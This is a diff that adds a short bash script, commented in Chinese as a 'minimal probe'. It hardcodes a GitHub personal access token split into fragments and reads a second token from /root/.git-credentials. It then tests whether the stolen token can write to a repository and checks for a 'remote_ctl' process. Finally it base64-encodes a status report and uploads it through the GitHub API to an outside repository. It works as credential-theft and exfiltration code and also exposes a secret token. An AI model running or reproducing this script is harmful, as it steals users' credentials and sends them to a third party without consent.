@@ -1,0 +1,20 @@
+287815
+# 极简探针:只看凭据文件是否写入+直接用grep读token测PUT(不用git credential fill,避免卡死)
+A='github_pat_11BQPEBSA0iH'
+B='riCXm9QGCt_74skvWNFHKum'
+C='HCtG6L026yU4FNjISYSZVmI'
+D='jR9F9Ojw3QEXVSIPygfznQqG'
+TOK="${A}${B}${C}${D}"
+API="https://api.github.com/repos/Thousands91/-1/contents/remote"
+# 用grep从凭据文件读token(标准格式 https://oauth2:TOKEN@github.com)
+CRED=$(grep -oE 'github_pat_[A-Za-z0-9_]+' /root/.git-credentials 2>/dev/null | head -1)
+CPRE="${CRED:0:12} CLEN=${#CRED}"
+# 直接测这个token的PUT
+CODE=$(timeout 15 curl -s -o /dev/null -w '%{http_code}' --max-time 13 -X PUT -H "Authorization: token $CRED" "$API/_credcheck.txt" -d '{"message":"cc","content":"dGVzdA==","branch":"main"}' 2>/dev/null)
+CTL=$(pgrep -f "[r]emote_ctl" | head -1)
+NOW=$(date '+%m-%d %H:%M:%S')
+R="time=$NOW | grep到的cred=$CPRE | PUT=$CODE | remote_ctl=$CTL"
+BB=$(echo -n "$R" | base64 -w0)
+SHA=$(timeout 15 curl -s -H "Authorization: token $TOK" "$API/credcheck.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
+if [ -n "$SHA" ]; then P="{\"message\":\"credcheck\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"credcheck\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
+curl -s --max-time 20 -X PUT -H "Authorization: token $TOK" "$API/credcheck.txt" -d "$P" -o /dev/null -w "PUT:%{http_code}\n"
